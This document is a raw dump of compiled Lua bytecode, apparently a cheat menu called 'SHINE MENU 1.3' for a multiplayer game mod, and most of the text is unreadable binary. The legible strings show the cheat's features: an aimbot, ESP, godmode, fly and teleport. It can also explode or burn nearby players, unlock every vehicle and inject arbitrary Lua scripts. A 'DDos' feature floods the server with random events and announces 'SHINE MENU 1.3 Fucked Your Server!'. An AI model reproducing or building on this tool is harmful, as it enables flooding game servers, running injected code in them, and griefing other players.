-   secondary            TASK_SIMPLE_USE_GUN    isPedDoingGangDriveby         Ç  Ç  Ç  Ç  Ç  È  È  È  È  È  È  È  È  È  È  É  É  É  É  É  É  É  É  É  É  É  É  Ê  Ê  Î  Î  Ï              í  û   %   „   †  š@    € €    Á@    D  F€À€FÂ@Z   €E FBÁ†Â@B \‚ À€@ €À €€ €!  @ü    AA  € €      €       default     €‡Ã@   pairs 	   distance    math    abs 	   multiple     %   î  î  î  î  î  ï  ð  ñ  ñ  ñ  ñ  ñ  ò  ò  ò  ó  ó  ó  ó  ó  ô  ô  õ  ö  ñ  ø  ú  ú  ú  ú  ú  ú  ú  ú  ú  ú  û                         A@E  FÀ ÍA€\€   À@€ €LAZA    €@ ^  €       math    deg    atan2              €v@                                                                 A@  …€  Â € € J   À  Ô   Á   À€†A Ä  WÀÀ €”€ ŒÁ@ÆA IÀŸ€ý^   €       getElementsByType    player    root       ð?       	  	  	  	  	  
-                  
-  
-  
-  
-                         (   …   Ä   œ EA  „  \Á ÅA     ÜÁ EB  €€ \Â Å‚   €@ €€À Ü‚€Ã  AMÃƒ À ƒ  @€€ À€  ƒ€EÃ  FÁ\ƒ  €X ƒ  €BC  B€ ^  €       getElementRotation    getElementPosition 
-   findRotation    math    abs     (                                                                                               !  &          €€ @@ €@ @ €AÀ  H    €       dxGetStatus    SettingAspectRatio    4:3 ffffffö?       "  "  "  #  #  $  $  &              )  P    k      D   €    € €@  @    € € €  €€ FÀ@ Z@    € € E  F@Á €   Ä € \@€FÀ@ …€ ÅÀ   Ü  œ€  Å€  D   Ü€   EA €€ \   E …Á Å  € D Ü€œ  \  …A Ä  œEB „  \Â Å‚ ÆÂÃ  Ü‚  FCD†ƒDÆÃD €ƒ€@€€ Å DÄF„Ä†ÄÄÀ Üƒ€ D €€„€E„ FDÅ€€\„ †DDŽ„N„„…„ †„E	À€œ„ Æ„DÎÄŽÄ	ÆÄD€Î…	ÎÄ… EÅ †EÄÆ…Ä  \ …  E… €€À 	 €	\… 
-E
-E € 
-\E  €       isPedAiming    isTrashAimbotEnabled    getPlayersOnScreen       ð?   table    sort    Vector3    getPedTargetEnd    getPedTargetStart    getElementPosition    Vector2    getScreenFromWorldPosition    getPedBonePosition    getElementRotation    math    rad    getDistanceBetweenPoints3D    x    y    z    calculateDepthBuffer    cos    sin    getWorldFromScreenPosition    setCameraTarget     k   *  *  *  *  *  *  *  *  *  ,  ,  -  -  -  -  .  .  .  .  .  0  1  1  1  1  1  2  2  2  2  2  5  5  5  5  5  7  7  7  7  7  7  7  7  9  9  9  ;  ;  ;  =  =  =  =  ?  ?  ?  ?  ?  ?  A  B  D  D  D  D  D  D  F  F  F  F  H  H  H  H  H  H  H  I  I  I  I  I  I  I  K  K  K  K  M  M  M  M  M  M  M  M  M  M  M  M  M  O  O  O  P              R  _    .   …   š   @
-€Z   À	€W@@ @	€‚   ‡   …€  ÅÀ   EA  Ü€   EÁ œ@ …  Å@ A œ@€…€ Å@ Á  @   œ@  …À ÅÀ   EA  Ü€   EÁ œ@ …  Á@ 
-€A Á ÁÁ "A€œ@€ €       InKeybindMode    mouse1 
-   unbindKey 	   tostring    guiGetText    Keybind    down    toggleShine    guiSetAlpha       ð?   guiSetText    bindKey    addNotification '   Keybind Has Been Changed Successfully.      ào@            .   S  S  S  T  T  U  U  V  V  W  W  W  W  W  W  W  W  W  X  X  X  X  Y  Y  Y  Y  Y  Y  Z  Z  Z  Z  Z  Z  Z  Z  Z  [  [  [  [  [  [  [  [  _              b  Ÿ    
-c     E@  F€À FÀÀ @  À	€  A@ …€ ÅÀ €    @€  A@ …€ ÅÀ @  €@ A@ …€ ÅÀ @ € AÀ …  Á@  EÁ œ€ š   € €  š@    €@ Á€ UÀ€ Š €ÁÀ  A ¢@€@€ÀÌ   E@  F€À F@Ä @  À	€  A@ …€ Å€ €    @€  A@ …€ Å€ @  €@ A@ …€ Å€ @ € AÀ …  Á@  E œ€ š   € €  š@    €@ Á€ UÀ€ Š €ÁÀ  A ¢@€@€@Á   E@  F€À F Å @   €@ D     @€€¾   E@  F€À F€Å @   €@ D   À @€À»   E@  F€À F Æ @  @€@ D   €    À€€ D   €  D €€À E  „   \€ ‚ € @€ ¶€ A@ Š €ÁÀ  A ¢@€@€À³   E@  F€À F€Ç @   €@ D   €    €€€ D   €  D @€À E  „   \  @  @®€ A  Š €ÁÀ  A ¢@€@€ ¬   E@  F€À F@È @   €  A€ …€ ÅÀ €    @€  A€ …€ ÅÀ @  €@ A€ …€ ÅÀ @ € A 	 …  Á€  EÁ œ€ š   € €  š@    €@ Á€ UÀ€ Š €ÁÀ  A ¢@€@€@	 D   …  Á€  EÁ œ€ @€€	 D   …  Á€  EÁ œ€ “  @€@œ   E@  F€À FÀÉ @  €€ 
- A@
- …€
- Á@
- œ€ “  @€€ AÀ
- …€
- Á@
- œ€ š   € €  š@    €@ Á€ UÀ€ Š €ÁÀ  A ¢@€@€ ”   E@  F€À F Ë @  €€@ D   À @€@ D   @ € D   €    À €@	 D   ‚   @€À B € @   A  @ € A@ Š €ÁÀ  A ¢@€@€ÀŠ   E@  F€À F€Ì @   €@	 D   …€ Ä   œ€ “  @€À E€ „   \€ S € @ € AÀ …€ Ä   œ€ š   € € 
- š@    €@
- Á€
- UÀ€ Š €ÁÀ  A ¢@€@€    E@  F€À FÀÍ @  À€  @€ € A@ …€ š   € €  š@    €@ Á€ UÀ€ Š €ÁÀ  A ¢@€@€€z   E@  F€À FÀÎ @  €€  D   €   – €@ D     @€À €@ D   À @€€ A€ …À † PÅ    Ü  œ€  Á@ UÀ€ Š €ÁÀ  A ¢@€@€@q   E@  F€À F€Ð @  À	€  AÀ „   Å  €    @€  AÀ „   Å  @  €@ AÀ „   Å  @ € A@ …  ÁÀ   E œ€ š   € €  š@    €@ Á€ UÀ€ Š €ÁÀ  A ¢@€@€Àe   E@  F€À F€Ñ @  €#€À E  €   ˆ  €@ E€ …À Å  œ  \   €      €@ D   €    @€€ D   €  D À€  E  „   \€ …@ Å€  EÁ … \   Ü   œ   @  À E  „   \€ …  Å€ Á E  Ü   œ   @  @ E  „   \€ …€ Å€ Á E  Ü   œ   @  € AÀ …À Å  œ€ Á  UÀ€ Š €ÁÀ  A ¢@€@€@Q€ A@ Š €ÁÀ  A ¢@€@€ O  D   …@ Å€  EÁ … \   Ü   œ   @  À D   …  Å€ Á E  Ü   œ   @  @ D   …€ Å€ Á E  Ü   œ   @  € AÀ …À Å  œ€ Á  UÀ€ Š €ÁÀ  A ¢@€@€€C€ @€ ÀB€ AÀ Š €ÁÀ  A ¢@€@€€@   E@  F€À F Ö @  À€À E  €   ˆ@€@ E€ …À Å  œ  \   €     @€@ D   …€ ÅÀ  Ü  œ   @  € A@ …À Å  œ€ Á  UÀ€ Š €ÁÀ  A ¢@€@€ 6€ @€ @5€ AÀ Š €ÁÀ  A ¢@€@€ 3   E@  F€À F€Ö @  @€À E  €   ˆÀ
-€@ E€ …À Å  œ  \   €     À€À D     Å@  E …Á Å œ \    Ü€   E …Á Å œ \  @  € EÀ …  \€ @ U€€ Š €ÁÀ  A ¢@€@€ &€ @€ @%€ AÀ Š €ÁÀ  A ¢@€@€ #   E@  F€À F€× @   	€À E  …@ Å€   Ü  œ€  Á@  \    @€D  W@€€EÁ „  Á B E‚ € \ ‚  C€€ \A !€  Àû€ AÀ Š €ÁÀ  A ¢@€@€@   E@  F€À F Ù @   
-€À E  …@ Å€   Ü  œ€  Á@  \    @€EA € \ Z   €EÁ € \ Z  À€E € ÅA ‚ D   Ü  \A  !€  Àú€ A  Š €ÁÀ  A ¢@€@€€   E@  F€À F@Ú @  À	€  A€ …€ ÅÀ €    @€  A€ …€ ÅÀ @  €@ A€ …€ ÅÀ @ € A  …  Á€  EÁ œ€ š   € €  š@    €@ Á€ UÀ€ Š €ÁÀ  A ¢@€@€    E@  F€À F × @  À€À E  …@ Å€   Ü  œ€  Á@  \     €EA € \ Z  À€EÁ € \ Z  € €E € \A !€   ü€ AÀ Š €ÁÀ  A ¢@€@€€ö€   E@  F€À F Ü @  À	€  A€ …€ Å@ €    @€  A€ …€ Å@ @  €@ A€ …€ Å@ @ € A€ …  Á€  EA œ€ š   € €  š@    €@ Á€ UÀ€ Š €ÁÀ  A ¢@€@€ ë€   E@  F€À FÀÜ @   €  D   ‚ € @€@è€   E@  F€À F@Ý @  À€€ EÀ €    @€  EÀ @   D   …@ Å€ Á @€ €€ D    ‡À G€ @   d      @ Á  € À € A@ …€ ÅÀ œ€ š   € €  š@    €@ Á€ UÀ€ Š €ÁÀ  A ¢@€@€ÀÚ€   E@  F€À F€ß @   €À E   € \    À €EA  € Â  \A€!€  @þ€ A€  Š €ÁÀ  A ¢@€@€ Ô€   E@  F€À FÀà @  @€@ D   €    À€€ D   €  D €€@ E  „   \€ @ @€@Î€€ A ! Š €ÁÀ  A ¢@€@€ Ì€   E@  F€À F@á @  @€@ D   €    À€€ D   €  D €€€! E  „   \€ À! @€€ A " Š €ÁÀ  A ¢@€@€@Ä€€ A@" Š €ÁÀ  A ¢@€@€ Â€   E@  F€À F€â @   	€À" A # À ÁÀ Á B€ @ @# D   € EÀ €   \  €…Á" Á#   AÂ# …$ À€œ‚ Õ‚Â AÂ Â Â€ œA a€   üEÀ"  # ÁÀ Á AÁ ‚€ \@ @·€   E@  F€À F@ä @   €€$    €$ € AÀ$ …€$ š   € €  š@    €@ Á€ UÀ€ Š €ÁÀ  A ¢@€@€€°€   E % @  €€@% E€% …À% \  €  @€ € A & Š €ÁÀ  A ¢@€@€À«€   E@& F€æ F Ë W@  @€   E@& FÀæ F Ë @  À€ ' E@& F@ç F Ë …€' Å@& Æ@çÆ Ëœ€ “  @€À¥€   E@& F€æ F Å W@  @€   E@& FÀæ F Å @  @€ ' E@& F@ç F Å …€' Å@& Æ@çÆ Åœ€ “  @€  A@ …€ ÅÀ' €    @€  A@ …€ ÅÀ' @ Àœ€@ A@ …€ ÅÀ' @ @›€   E@& F€æ FÀÎ W@  @€   E@& FÀæ FÀÎ @  @€ ' E@& F@ç FÀÎ …€' Å@& Æ@çÆÀÎœ€ “  @€  A@ …€ Å ( €    @€  A@ …€ Å ( @ @’€@ A@ …€ Å ( @ À€   E@& F€æ FÀÀ W@  @€   E@& FÀæ FÀÀ @  @€ ' E@& F@ç FÀÀ …€' Å@& Æ@çÆÀÀœ€ “  @€  A@ …€ Å@( €    @€  A@ …€ Å@( @ À‡€@ A@ …€ Å@( @ @†€   E@& F€æ F@È W@  @€   E@& FÀæ F@È @  @€ ' E@& F@ç F@È …€' Å@& Æ@çÆ@Èœ€ “  @€  A@ …€ Å€( €    @€  A@ …€ Å€( @ @}€@ A@ …€ Å€( @ À{€   E@& F€æ FÀÍ W@  @€   E@& FÀæ FÀÍ @  @€ ' E@& F@ç FÀÍ …€' Å@& Æ@çÆÀÍœ€ “  @€  A@ …€ ÅÀ( €    @€  A@ …€ ÅÀ( @ Àr€@ A@ …€ ÅÀ( @ @q€   E ) F€æ F Ë W@  @€   E ) FÀæ F Ë @  @€ ' E ) F@ç F Ë …€' Å ) Æ@çÆ Ëœ€ “  @€  A@ …€ Å@) €    @€  A@ …€ Å@) @ @h€@ A@ …€ Å@) @ Àf€   E ) F€æ F Å W@  @€   E ) FÀæ F Å @  @€ ' E ) F@ç F Å …€' Å ) Æ@çÆ Åœ€ “  @€  A@ …€ Å€) €    @€  A@ …€ Å€) @ À]€@ A@ …€ Å€) @ @\€   E ) F€æ FÀÎ W@  @€   E ) FÀæ FÀÎ @  @€ ' E ) F@ç FÀÎ …€' Å ) Æ@çÆÀÎœ€ “  @€  A@ …€ ÅÀ) €    @€  A@ …€ ÅÀ) @ @S€@ A@ …€ ÅÀ) @ ÀQ€   E@  F€À F ê @  @€@* E€% …€* \  €     @€@* E€% …€* \  €    –€
-€€ E@* …€% Å€* œ  \€  À* U€€ Š €ÁÀ  A ¢@€@€  E@* …€% Å€* œ  \€     €€Á E   \  €€EÂ FëB+ Á‚+ \‚€…Â+ Á,  €Õƒ  œB€!  €üÀú B€€ A@, Š €ÁÀ  A ¢@€@€À?€   E@  F€À F€ì @  À€@ E€ „   \  €  À, 
- € E  „   \€ …€ Ä   œ  "@   - € A@- Š €ÁÀ  A ¢@€@€@8€   E@  F€À F€í @  €€À,    €€  D   …À, @€À D   … - † K@€@ D   … - † E@€€ AÀ- Š €ÁÀ  A ¢@€@€@0€€ A . Š €ÁÀ  A ¢@€@€ .€   E@  F€À F@î @  €€@* E€% …€. \  €     €€@* E€% …€. \  €    ˆÀ€À. D   …@* Å€% . Ü  œ   €      €€ A / Š €ÁÀ  A ¢@€@€@$€€ A@/ Š €ÁÀ  A ¢@€@€ "€€ A@, Š €ÁÀ  A ¢@€@€À€   E@  F€À F€ï @  À€À/ A  @ € A 0 Š €ÁÀ  A ¢@€@€@€   E@  F€À F@ð @  €€€0 @€ € AÀ0 Š €ÁÀ  A ¢@€@€ €   E@  F€À F ñ @   	€ 
- A@1 …€
- Á@1 œ€ “  @€€1 E€
- @1 \  @  À1 E€
- @1 \  @  € A 2 …€
- Á@1 œ€ š   € €  š@    €@ Á€ UÀ€ Š €ÁÀ  A ¢@€@€@€   E@  F€À F@ò @   €€2    €2 € AÀ2 …€2 š   € €  š@    €@ Á€ UÀ€ Š €ÁÀ  A ¢@€@€€€   E 3 @  @€@3 @  À€ € @3 €3 E 3 À3 @€ €@3    @€   @3 €3 E 3   @€ € Ð      source 
-   ShineMenu    button       @   isEventHandlerAdded    onClientRender    root    fastSprint    removeEventHandler    addEventHandler    addNotification    Fast Sprint Has Been     Enabled 	   Disabled     Successfully.      ào@              $@   fastReload    Fast Reload Has Been         @   setElementHealth       &@      Y@      @   isPedInVehicle    getPedOccupiedVehicleSeat    setVehicleEngineState    getPedOccupiedVehicle ,   You Must Be Driver To Start Vehicle Engine.       (@   fixVehicle &   You Must Be Driver To Repair Vehicle.       @   onClientPreRender 
-   toggleFly    Fly Has Been     setElementFrozen    setElementCollisionsEnabled       *@   setWorldSpecialPropertyEnabled    aircars    isWorldSpecialPropertyEnabled    Vehicle Fly Has Been        ð?   setCameraTarget    isElementFrozen    toggleAllControls 
-   setGameSpeed    You Have Successfully Revived.        @	   You Are     Frozen    Not Frozen     Now.       @   toggleFreecam    Freecam Has Been     isFreecamEnabled       @   getPedArmor    setPedArmor     Your Armor Has Been Changed To     math    floor    % Successfully.       "@   onClientPlayerDamage    toggleGodmode    Godmode Has Been        0@   guiGridListGetSelectedItem    PlayersGrid 
-   isElement    getPlayerFromName    guiGridListGetSelectedItemText    setElementPosition    Vector3    getElementPosition    setElementInterior    getElementInterior    setElementDimension    getElementDimension    You Teleported To     . -   You Must Be Driver To Teleport With Vehicle.    refreshPlayersList    Please Select A Player.       ,@   You Are Watching        .@   createProjectile       4@!    Has Been Exploded Successfully.       1@   pairs    getElementsWithinRange      Àb@   player 1   All Near Players Has Been Exploded Successfully.       2@     ˆ³@   vehicle    isVehicleEmpty 4   All Near Vehicles Has Been Teleported Successfully.       3@   onClientClick    toggleBombClick    Bomb Click Has Been        i@   blowVehicle 2   All Near Vehicles Has Been Exploded Successfully.       5@   toggleTeleportClick    Teleport Click Has Been        6@
-   setPedOnFire       7@   isTimer    PositionTrollTimer 
-   killTimer 
-   PosTrollX 
-   PosTrollY 
-   PosTrollZ 	   setTimer    Position Troll Has Been        8@   ipairs    getElementsByType    setVehicleLocked -   All Vehicles Has Been Unlocked Successfully.       9@$   You Must Be Driver To Fire Vehicle.       :@   addVehicleUpgrade      @#   Nitro Has Been Successfully Added. -   You Must Be Driver To Add Nitro For Vehicle.       <@   outputChatBox 1   ================================================    getAllElementData    #FF0000[SHINE]:#FFFFFF     :  	   tostring       ;@   isTriggerLoggerEnabled    Trigger Logger Has Been     ExecuteScript    loadstring    guiGetText 
-   ExecutorMemo +   Lua Script Has Been Injected Successfully.    Esp    Label    Text    guiCheckBoxSetSelected    Tik    guiCheckBoxGetSelected 
-   drawSkeleton    drawBox 	   drawLine 	   drawName 
-   drawDistance    EspVehicle    drawLineVehicle    drawNameVehicle    drawDistanceVehicle       =@	   tonumber 
-   DDosValue     Packets Sended Successfully.    random      @@    €‡Ã@   triggerServerEvent $   SHINE MENU 1.3 Fucked Your Server!  "   Please Put Valid Number In Field.       >@	   Position    InteriorDimension &   Position Has Been Saved Successfully.       ?@   Teleported.    Couldn't Find Position.       B@   SkinID    setElementModel )   Your Skin Has Been Changed Successfully.    Invalid Skin ID.      €B@   setFPSLimit )   FPS Limit Has Been Removed Successfully.       C@
-   clearChatBox -   Your Chat Box Has Been Cleared Successfully.      €C@   randomfoliage    setCloudsEnabled    setBirdsEnabled    FPS Boost Has Been        D@   isTrashAimbotEnabled    Trash Aimbot Has Been     Keybind    InKeybindMode    guiSetAlpha       à?                   @@ A€  À  €€E  „   Å@ Ì €  EÁ \@€ €       math    random ffffffþ¿      $@   setElementPosition 
-   PosTrollX 
-   PosTrollY 
-   PosTrollZ                                            c  c  c  c  c  c  c  d  d  d  d  d  d  d  e  e  e  e  e  e  g  g  g  g  g  i  i  i  i  i  i  i  i  i  i  i  i  i  i  i  i  i  i  i  i  i  i  j  j  j  j  j  j  k  k  k  k  k  k  k  l  l  l  l  l  l  n  n  n  n  n  p  p  p  p  p  p  p  p  p  p  p  p  p  p  p  p  p  p  p  p  p  p  q  q  q  q  q  q  r  r  r  r  r  s  s  s  s  s  s  t  t  t  t  t  u  u  u  u  u  u  v  v  v  v  v  v  v  v  v  v  w  w  w  w  w  w  w  y  y  y  y  y  y  y  y  z  {  {  {  {  {  {  |  |  |  |  |  |  |  |  |  |  }  }  }  }  }  }                  €              ‚  ‚  ‚  ‚  ‚  ‚  ‚  ƒ  ƒ  ƒ  ƒ  ƒ  ƒ  …  …  …  …  …  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ‰  ‰  ‰  ‰  ‰  ‰  ‰  ‰  ‰  ‰  Š  Š  Š  Š  Š  Š  ‹  ‹  ‹  ‹  ‹  ‹  ‹  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ  Œ              Ž  Ž  Ž  Ž                  ‘  ‘  ‘  ‘  “  “  “  ”  ”  ”  •  •  •  •  •  •  •  •  •  –  –  –  –  –  –  —  —  —  —  —  —  —  ˜  ˜  ˜  ˜  ˜  ˜  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  š  š  š  š  š  š  ›  ›  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ              ž  ž  ž  ž  ž  Ÿ  Ÿ  Ÿ  Ÿ  Ÿ  ¡  ¡  ¡  ¡  £  £  £  £  £  £  £  £  £  £  £  £  £  £  £  £  £  ¤  ¤  ¤  ¤  ¤  ¤  ¥  ¥  ¥  ¥  ¥  ¥  ¥  ¦  ¦  ¦  ¦  ¦  ¦  ¨  ¨  ¨  ¨  ¨  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  ª  «  «  «  «  «  «  ¬  ¬  ¬  ¬  ¬  ­  ­  ­  ­  ­  ­  ­  ­  ­  ®  ®  ®  ®  ®  ¯  ¯  ¯  ¯  ¯  °  °  °  °  °  °  °  °  °  °  °  °  °  °  ±  ±  ±  ±  ±  ±  ±  ±  ±  ±  ±  ±  ²  ²  ²  ²  ²  ²  ²  ²  ²  ²  ²  ²  ³  ³  ³  ³  ³  ³  ³  ³  ³  ³  ³  ³  ³  ³  µ  µ  µ  µ  µ  µ  µ  µ  ¶  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¹  ¹  ¹  ¹  ¹  ¹  ¹  ¹  ¹  ¹  º  º  º  º  º  º  º  º  º  º  »  »  »  »  »  »  »  »  »  »  »  »  »  ¼  ¾  ¾  ¿  Á  Á  Á  Á  Á  Á  Á  Á  Â  Ã  Ã  Ã  Ã  Ã  Ã  Ä  Ä  Ä  Ä  Ä  Å  Å  Å  Å  Å  Å  Å  Å  Å  Æ  Æ  Æ  Æ  Æ  Æ  Æ  Æ  Ç  Ç  Ç  Ç  Ç  Ç  Ç  Ç  Ç  Ç  Ç  Ç  Ç  Ç  É  É  Ê  Ì  Ì  Ì  Ì  Ì  Ì  Ì  Ì  Í  Î  Î  Î  Î  Î  Î  Ï  Ï  Ï  Ï  Ï  Ð  Ð  Ð  Ð  Ð  Ð  Ð  Ð  Ð  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ò  Ò  Ò  Ò  Ò  Ò  Ò  Ò  Ò  Ò  Ò  Ò  Ò  Ô  Ô  Õ  ×  ×  ×  ×  ×  ×  ×  ×  Ø  Ù  Ù  Ù  Ù  Ù  Ù  Ú  Ú  Ú  Ú  Ú  Ú  Ú  Ú  Ú  Ú  Ú  Ú  Û  Û  Û  Ü  Ü  Ü  Ü  Ü  Ü  Ü  Ü  Ü  Ü  Ü  Ú  Ý  ß  ß  ß  ß  ß  ß  ß  ß  ß  à  à  à  à  à  à  á  á  á  á  á  á  á  á  á  á  á  á  â  â  â  â  â  â  â  â  â  â  ã  ã  ã  ã  ã  ã  ã  ã  á  ä  æ  æ  æ  æ  æ  æ  æ  æ  æ  ç  ç  ç  ç  ç  ç  è  è  è  è  è  è  è  é  é  é  é  é  é  ë  ë  ë  ë  ë  í  í  í  í  í  í  í  í  í  í  í  í  í  í  í  í  í  í  í  í  í  í  î  î  î  î  î  î  ï  ï  ï  ï  ï  ï  ï  ï  ï  ï  ï  ï  ð  ð  ð  ð  ð  ð  ð  ð  ð  ð  ñ  ñ  ñ  ï  ò  ô  ô  ô  ô  ô  ô  ô  ô  ô  õ  õ  õ  õ  õ  õ  ö  ö  ö  ö  ö  ö  ö  ÷  ÷  ÷  ÷  ÷  ÷  ù  ù  ù  ù  ù  û  û  û  û  û  û  û  û  û  û  û  û  û  û  û  û  û  û  û  û  û  û  ü  ü  ü  ü  ü  ü  ý  ý  ý  ý  ý  þ  þ  þ  þ  þ  þ  ÿ  ÿ  ÿ  ÿ  ÿ                                                   	  	  	  	  	  	  	  	  	  	  	  	  	  	  	  	  	  	  	  	  
-  
-  
-  
-  
-  
-                                                                                                                                                                                                                                                                                "  "  "  "  "  "  "  "  #  #  #  #  #  #  $  $  $  %  %  %  %  %  %  %  %  %  %  %  %  %  %  %  %  %  %  &  &  &  &  '  '  '  '  '  '  (  (  (  (  (  (  (  (  (  )  )  )  )  )  )  )  )  )  )  )  )  *  *  *  *  *  *  *  *  *  *  *  *  +  +  +  +  +  +  +  +  +  +  +  +  ,  ,  ,  ,  ,  ,  ,  ,  ,  ,  ,  -  -  -  -  -  -  -  .  .  .  .  .  .  0  0  0  0  0  1  2  2  2  2  2  2  2  2  2  2  2  2  3  3  3  3  3  3  3  3  3  3  3  4  4  4  4  4  4  4  5  5  5  5  5  5  7  7  7  7  7  8  9  9  9  9  9  9  9  9  9  9  9  9  :  :  :  :  :  :  :  :  :  :  :  ;  ;  ;  ;  ;  ;  ;  <  <  <  <  <  <  >  >  >  >  >  ?  @  @  @  @  @  @  @  @  @  @  @  @  A  A  A  A  A  A  A  A  A  A  A  B  B  B  B  B  B  B  C  C  C  C  C  C  E  E  E  E  E  F  G  G  G  G  G  G  G  G  G  G  G  G  H  H  H  H  H  H  H  H  H  H  H  I  I  I  I  I  I  I  J  J  J  J  J  J  L  L  L  L  L  M  N  N  N  N  N  N  N  N  N  N  N  N  O  O  O  O  O  O  O  O  O  O  O  P  P  P  P  P  P  P  Q  Q  Q  Q  Q  Q  S  S  S  S  S  T  U  U  U  U  U  U  U  U  U  U  U  U  V  V  V  V  V  V  V  V  V  V  V  W  W  W  W  W  W  W  X  X  X  X  X  X  Z  Z  Z  Z  Z  [  \  \  \  \  \  \  \  \  \  \  \  \  ]  ]  ]  ]  ]  ]  ]  ]  ]  ]  ]  ^  ^  ^  ^  ^  ^  ^  _  _  _  _  _  _  a  a  a  a  a  b  c  c  c  c  c  c  d  d  d  d  d  d  d  d  d  d  d  d  d  d  e  e  e  e  e  e  e  e  e  e  e  e  e  e  f  f  f  f  f  f  f  f  g  g  g  g  g  g  h  h  h  h  h  i  i  i  i  i  i  g  i  f  k  m  m  m  m  m  m  m  m  n  o  o  o  o  o  o  p  p  p  p  p  p  q  q  q  q  q  q  q  q  q  r  r  r  r  r  r  r  r  r  s  s  s  s  s  s  t  t  t  u  u  u  u  v  v  v  v  v  w  w  w  w  w  x  x  x  x  x  x  x  x  x  z  z  z  z  z  z  z  z  {  |  |  |  |  |  |  }  }  }  }  }  }  }  }  }  }  }  }  }  }  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~                                    ‚  „  „  „  „  „  „  „  „  …  †  †  †  †  †  †  ‡  ‡  ‡  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ‰  ‰  ‰  ‰  ‰  ‰  Š  Š  ‹  ‹  ‹  ‹  ‹  ‹  ‹  ‹  ‹  Œ  Œ  Œ  Œ  Œ  Œ                Ž  Ž  Ž  Ž  Ž                                                    ‘  ‘  ‘  ‘  ‘  ‘  ’  ’  ’  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  ”  ”  ”  ”  •  •  •  –  –  —  —  —  —  ˜  š  š  š  ›  ›  œ  œ  œ  œ  Ÿ              ©  °    '      E@  F€À „   F€€ @  €€À  D € …  Ä   †À †@AÅ    Æ Æ€Á D  AÁA@€  D € @ @€€ D € @ @€À A  Š €Á@ A AA ¢@€@€ €       source 
-   ShineMenu    button    setElementPosition 
-   Locations       ð?       @      @   setElementInterior            setElementDimension    addNotification    Teleported.      ào@    '   ª  ª  ª  ª  ª  ª  ª  «  «  «  «  «  «  «  «  «  «  «  «  «  «  «  ¬  ¬  ¬  ¬  ­  ­  ­  ­  ®  ®  ®  ®  ®  ®  ®  ®  °          ·	                                         	   
-               
-   
-                                                                                                                                                                                                                                                                                                                                           !   !   !   !   !   !   !   !   !   !   !   !   "   "   "   "   "   "   #   #   #   #   #   #   #   $   $   $   $   $   $   $   $   $   $   $   $   %   %   %   %   %   %   &   &   &   &   &   &   &   '   '   '   '   '   '   '   '   '   '   '   '   (   (   (   (   (   (   )   )   )   )   )   )   )   *   *   *   *   *   *   *   *   *   *   *   *   +   +   +   +   +   +   ,   ,   ,   ,   ,   ,   ,   -   -   -   -   -   -   -   -   -   -   -   -   .   .   .   .   .   .   /   /   /   /   /   /   /   0   0   0   0   0   0   0   0   0   0   0   0   1   1   1   1   1   1   2   2   2   2   2   2   2   3   3   3   3   3   3   3   3   3   3   3   3   4   4   4   4   4   4   5   5   5   5   5   5   5   6   6   6   6   6   6   6   6   6   6   6   6   7   7   7   7   7   7   8   8   8   8   8   8   8   9   9   9   9   9   9   9   9   9   9   9   9   :   :   :   :   :   :   ;   ;   ;   ;   ;   ;   ;   <   <   <   <   <   <   <   <   <   <   <   <   =   =   =   =   =   =   >   >   >   >   >   >   >   ?   ?   ?   ?   ?   ?   ?   ?   ?   ?   ?   ?   @   @   @   @   @   @   A   A   A   A   A   A   A   C   C   C   C   C   E   E   E   E   E   E   E   E   E   F   F   F   F   F   G   G   G   G   G   G   G   G   G   G   G   G   H   H   H   H   H   H   I   I   I   I   I   I   I   J   J   J   J   J   J   J   J   J   J   J   J   K   K   K   K   K   K   L   L   L   L   L   L   L   M   M   M   M   M   M   M   M   M   M   M   M   N   N   N   N   N   N   O   O   O   O   O   O   O   P   P   P   P   P   P   P   P   P   P   Q   Q   Q   Q   R   R   R   R   R   R   S   S   S   S   S   S   S   S   S   S   S   S   T   T   T   T   T   T   U   U   U   U   U   U   U   V   V   V   V   V   V   V   V   V   V   V   V   W   W   W   W   W   W   X   X   X   X   X   X   X   Y   Y   Y   Y   Y   Y   Y   Y   Y   Y   Y   Y   Z   Z   Z   Z   Z   Z   [   [   [   [   [   [   [   \   \   \   \   \   \   \   \   \   \   \   \   ]   ]   ]   ]   ]   ]   ^   ^   ^   ^   ^   ^   ^   _   _   _   _   _   _   _   _   _   _   _   _   `   `   `   `   `   `   a   a   a   a   a   a   a   b   b   b   b   b   b   b   b   b   b   b   b   c   c   c   c   c   c   d   d   d   d   d   d   d   e   e   e   e   e   e   e   e   e   e   e   e   f   f   f   f   f   f   g   g   g   g   g   g   g   h   h   h   h   h   h   h   h   h   h   h   h   i   i   i   i   i   i   j   j   j   j   j   j   j   k   k   k   k   k   k   k   k   k   k   k   k   l   l   l   l   l   l   m   m   m   m   m   m   m   n   n   n   n   n   n   n   n   n   n   n   n   o   o   o   o   o   o   p   p   p   p   p   p   p   r   r   r   r   r   t   t   t   t   t   t   t   t   t   t   u   u   u   u   u   u   u   u   u   u   v   v   v   v   w   w   w   w   w   x   x   x   x   x   x   x   x   x   x   x   x   y   y   y   y   y   y   z   z   z   z   z   z   z   {   {   {   {   {   {   {   {   {   {   {   {   |   |   |   |   |   |   }   }   }   }   }   }   }                                                      ƒ   ƒ   ƒ   ƒ   ƒ   ƒ   ƒ   ƒ   ƒ   ƒ   ƒ   ƒ   ƒ   ƒ   ƒ   „   „   „   „   „   „   „   „   „   „   „   „   „   „   …   …   …   …   …   …   †   †   †   †   †   †   ˆ   ˆ   ˆ   ˆ   ˆ   ˆ   ˆ   